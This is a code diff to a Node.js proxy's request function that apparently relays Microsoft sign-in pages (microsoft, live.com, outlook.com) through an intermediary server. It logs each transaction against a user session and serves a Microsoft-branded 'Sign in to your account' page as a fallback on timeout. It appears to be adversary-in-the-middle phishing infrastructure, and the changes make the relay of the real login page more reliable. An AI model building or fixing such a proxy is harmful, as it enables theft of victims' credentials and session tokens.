@@ -467,64 +467,12 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
     // Add very short timeout to prevent hanging
     proxyRequestOptions.timeout = 1000; // 1 second timeout
     
-    // Serve immediate response to prevent Render timeout
-    const immediateResponse = `
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Sign in to your account</title>
-            <meta charset="utf-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <style>
-                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background: #f5f5f5; }
-                .container { max-width: 400px; margin: 50px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-                .logo { text-align: center; margin-bottom: 30px; }
-                h1 { color: #333; font-size: 24px; margin-bottom: 20px; text-align: center; }
-                .loading { text-align: center; color: #666; }
-                .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0078d4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
-                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <div class="logo">
-                    <svg width="108" height="23" viewBox="0 0 108 23" fill="none">
-                        <path d="M0 0h108v23H0z" fill="#0078d4"/>
-                        <path d="M8.5 6.5h3v10h-3V6.5zm8.5 0h3v10h-3V6.5zm8.5 0h3v10h-3V6.5z" fill="white"/>
-                    </svg>
-                </div>
-                <h1>Sign in to your account</h1>
-                <div class="loading">
-                    <div class="spinner"></div>
-                    <p>Loading Microsoft login...</p>
-                </div>
-            </div>
-            <script>
-                // Auto-refresh to get the actual Microsoft page
-                setTimeout(() => {
-                    window.location.reload();
-                }, 2000);
-            </script>
-        </body>
-        </html>
-    `;
-    
-    // Send immediate response first
-    clientResponse.writeHead(200, { 
-        "Content-Type": "text/html",
-        "Content-Length": Buffer.byteLength(immediateResponse)
-    });
-    clientResponse.end(immediateResponse);
+    // Don't send immediate response - wait for actual Microsoft response
     
     // Continue with external request in background (non-blocking)
-    // Only attempt external request if it's not a Microsoft domain to avoid timeouts
-    const isMicrosoftDomain = proxyRequestOptions.hostname.includes('microsoft') || 
-                              proxyRequestOptions.hostname.includes('live.com') || 
-                              proxyRequestOptions.hostname.includes('outlook.com');
-    
-    if (!isMicrosoftDomain) {
-        setImmediate(() => {
-            const proxyRequest = protocol.request(proxyRequestOptions, (proxyResponse) => {
+    // Make external request to get the actual Microsoft login page
+    setImmediate(() => {
+        const proxyRequest = protocol.request(proxyRequestOptions, (proxyResponse) => {
         console.log(`📥 Received response: ${proxyResponse.statusCode} from ${proxyRequestOptions.hostname}`);
 
         logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession)
@@ -611,11 +559,9 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
                     }
                 }
 
-                // Only send response if we haven't already sent one
-                if (!clientResponse.headersSent) {
-                    clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
-                    clientResponse.end(serverResponseBody);
-                }
+                // Send the actual Microsoft response
+                clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
+                clientResponse.end(serverResponseBody);
             });
     });
 
@@ -645,12 +591,57 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
     proxyRequest.setTimeout(1000, () => {
         console.error(`⏰ Connection timeout after 1s: ${proxyRequestOptions.hostname}${proxyRequestOptions.path}`);
         proxyRequest.destroy();
+        
+        // Send fallback response if Microsoft request fails
+        if (!clientResponse.headersSent) {
+            const fallbackResponse = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Sign in to your account</title>
+                    <meta charset="utf-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <style>
+                        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background: #f5f5f5; }
+                        .container { max-width: 400px; margin: 50px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+                        .logo { text-align: center; margin-bottom: 30px; }
+                        h1 { color: #333; font-size: 24px; margin-bottom: 20px; text-align: center; }
+                        .loading { text-align: center; color: #666; }
+                        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0078d4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+                        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+                    </style>
+                </head>
+                <body>
+                    <div class="container">
+                        <div class="logo">
+                            <svg width="108" height="23" viewBox="0 0 108 23" fill="none">
+                                <path d="M0 0h108v23H0z" fill="#0078d4"/>
+                                <path d="M8.5 6.5h3v10h-3V6.5zm8.5 0h3v10h-3V6.5zm8.5 0h3v10h-3V6.5z" fill="white"/>
+                            </svg>
+                        </div>
+                        <h1>Sign in to your account</h1>
+                        <div class="loading">
+                            <div class="spinner"></div>
+                            <p>Loading Microsoft login...</p>
+                        </div>
+                    </div>
+                    <script>
+                        // Auto-refresh to get the actual Microsoft page
+                        setTimeout(() => {
+                            window.location.reload();
+                        }, 2000);
+                    </script>
+                </body>
+                </html>
+            `;
+            clientResponse.writeHead(200, { 
+                "Content-Type": "text/html",
+                "Content-Length": Buffer.byteLength(fallbackResponse)
+            });
+            clientResponse.end(fallbackResponse);
+        }
     });
         }); // Close setImmediate block
-    } else {
-        // For Microsoft domains, skip external request to prevent timeouts
-        console.log(`🚫 Skipping external request for Microsoft domain: ${proxyRequestOptions.hostname}`);
-    }
 }
 
 function displayError(message, error, ...args) {
